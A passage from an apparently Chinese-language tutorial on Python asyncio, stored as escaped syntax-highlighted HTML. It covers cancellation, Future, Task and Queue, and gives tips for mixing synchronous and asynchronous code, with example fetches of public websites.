    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CancelledError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;main(): cancel_me is cancelled now&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;

&lt;span class="c1"&gt;# Expected output:&lt;/span&gt;
&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;span class="c1"&gt;#     cancel_me(): before sleep&lt;/span&gt;
&lt;span class="c1"&gt;#     cancel_me(): cancel sleep&lt;/span&gt;
&lt;span class="c1"&gt;#     cancel_me(): after sleep&lt;/span&gt;
&lt;span class="c1"&gt;#     main(): cancel_me is cancelled now&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="future"&gt;Future&lt;/h3&gt;
&lt;p&gt;Future 表示一个异步操作的 最终结果。&lt;/p&gt;
&lt;p&gt;在 asyncio 中需要 Future 对象以便允许通过 async/await 使用基于&lt;code&gt;回调&lt;/code&gt;风格的代码。需要注意大多数asyncio调度函数不允许传递关键字参数。为此，请使用&lt;code&gt;functools.partial()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通常情况下 没有必要 在应用层级的代码中创建 Future 对象。Future 对象有时会由库和某些 asyncio API 暴露给用户。用作可等待对象。&lt;/p&gt;
&lt;p&gt;Future 和 Promise 很像.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 这个例子并不好，引入了不必要的复杂性(线程)&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;aiohttp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;start_background_loop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_event_loop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_forever&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Create a new loop&lt;/span&gt;
&lt;span class="n"&gt;new_loop&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new_event_loop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Assign the loop to another thread&lt;/span&gt;
&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;start_background_loop&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_loop&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;
&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Give it some async work&lt;/span&gt;
&lt;span class="n"&gt;future&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_coroutine_threadsafe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
    &lt;span class="n"&gt;new_loop&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Wait for the result&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="c1"&gt;# Do it again but with a callback&lt;/span&gt;
&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_coroutine_threadsafe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.github.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="n"&gt;new_loop&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_done_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;超时问题:  &lt;a href="https://docs.python.org/zh-cn/3.8/library/asyncio-task.html#scheduling-from-other-threads"&gt;来自其他线程的日程安排&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="taskfuture"&gt;Task对象与Future对象&lt;/h3&gt;
&lt;p&gt;asyncio.Task 从 Future 继承了其除 Future.set_result() 和 Future.set_exception() 以外的所有 API。&lt;/p&gt;
&lt;h3 id="queue"&gt;Queue&lt;/h3&gt;
&lt;p&gt;为协程设计的queue，与用于线程的queue，两个类在设计上相似。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;time&lt;/span&gt;


&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;worker&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# Get a &amp;quot;work item&amp;quot; out of the queue.&lt;/span&gt;
        &lt;span class="n"&gt;sleep_for&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="c1"&gt;# Sleep for the &amp;quot;sleep_for&amp;quot; seconds.&lt;/span&gt;
        &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sleep_for&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c1"&gt;# Notify the queue that the &amp;quot;work item&amp;quot; has been processed.&lt;/span&gt;
        &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;task_done&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{name} has slept for {sleep_for:.2f} seconds&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="c1"&gt;# Create a queue that we will use to store our &amp;quot;workload&amp;quot;.&lt;/span&gt;
    &lt;span class="n"&gt;queue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# Generate random timings and put them into the queue.&lt;/span&gt;
    &lt;span class="n"&gt;total_sleep_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;sleep_for&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uniform&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.05&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;1.0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;total_sleep_time&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;sleep_for&lt;/span&gt;
        &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put_nowait&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sleep_for&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Create three worker tasks to process the queue concurrently.&lt;/span&gt;
    &lt;span class="n"&gt;tasks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_task&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;worker&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;worker-{i}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Wait until the queue is fully processed.&lt;/span&gt;
    &lt;span class="n"&gt;started_at&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;monotonic&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;total_slept_for&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;monotonic&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;started_at&lt;/span&gt;

    &lt;span class="c1"&gt;# Cancel our worker tasks.&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cancel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="c1"&gt;# Wait until all worker tasks are cancelled.&lt;/span&gt;
    &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gather&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;tasks&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;return_exceptions&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;====&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;3 workers slept in parallel for {total_slept_for:.2f} seconds&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;total expected sleep time: {total_sleep_time:.2f} seconds&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id="_4"&gt;坑与技巧&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://hackernoon.com/controlling-python-async-creep-ec0a0f4b79ba"&gt;Controlling Python Async Creep&lt;/a&gt;一文给出了很多精彩的总结。&lt;/p&gt;
&lt;p&gt;如文中所言，许多情况下，我们可能被迫与同步代码交互。尽管异步编程在Python存在多时，但正式被纳入语言中的时间还不长，所以大量第三方库都是同步风格的代码。于是我们会面临文中所说的&lt;code&gt;异步蠕变&lt;/code&gt;(Async Creep)的问题: 异步代码会要求调用它的代码也是异步的。&lt;/p&gt;
&lt;p&gt;这个过渡阶段可能会长期存在，让同步代码与异步代码一同工作的技巧，就显得有实际价值了。以下是&lt;a href="https://hackernoon.com/@tryexceptpass"&gt;Cristian Medina&lt;/a&gt;总结的一些技巧&lt;/p&gt;
&lt;h3 id="_5"&gt;等待异步代码块&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;asyncio&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;aiohttp&lt;/span&gt;
&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;aiohttp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;loop&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_event_loop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_until_complete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gather&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ensure_future&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
    &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ensure_future&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.github.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
    &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ensure_future&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.reddit.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;asyncio.ensure_future()&lt;/code&gt;将异步函数转换为协程，&lt;code&gt;asyncio.gather()&lt;/code&gt;将它们打包在一起，并发执行。同时&lt;code&gt;loop.run_until_complete()&lt;/code&gt;阻塞直到所有调用完成。&lt;/p&gt;
&lt;h3 id="_6"&gt;使用线程&lt;/h3&gt;
&lt;p&gt;创建一个作为worker的独立线程。它运行自己的事件循环，并使用线程安全的asyncio方法来使其工作。&lt;/p&gt;
&lt;p&gt;我们在前头举过这个例子，当时用于解释Future的回调。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# 这个例子并不好，引入了不必要的复杂性(线程)&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;threading&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;

&lt;span class="n"&gt;async&lt;/span&gt; &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;aiohttp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;await&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;start_background_loop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_event_loop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_forever&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Create a new loop&lt;/span&gt;
&lt;span class="n"&gt;new_loop&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new_event_loop&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Assign the loop to another thread&lt;/span&gt;
&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;start_background_loop&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_loop&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;
&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Give it some async work&lt;/span&gt;
&lt;span class="n"&gt;future&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_coroutine_threadsafe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; 
    &lt;span class="n"&gt;new_loop&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Wait for the result&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="c1"&gt;# Do it again but with a callback&lt;/span&gt;
&lt;span class="n"&gt;asyncio&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run_coroutine_threadsafe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;fetch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.github.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="n"&gt;new_loop&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_done_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;()))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;run_coroutine_threadsafe&lt;/code&gt;返回Future对象。我们可以使用&lt;code&gt;result(timeout)&lt;/code&gt;方法&lt;code&gt;wait&lt;/code&gt;它。&lt;/p&gt;
&lt;p&gt;使用回调风格时，&lt;code&gt;add_done_callback(function)&lt;/code&gt;中的回调函数(&lt;code&gt;function&lt;/code&gt;)收到future作为参数。&lt;/p&gt;
&lt;h3 id="_7"&gt;同时支持异步和同步调用的函数&lt;/h3&gt;
&lt;p&gt;这个技巧最早我在&lt;a href="https://github.com/anki/cozmo-python-sdk/"&gt;cozmo-python-sdk&lt;/a&gt;读到。&lt;/p&gt;
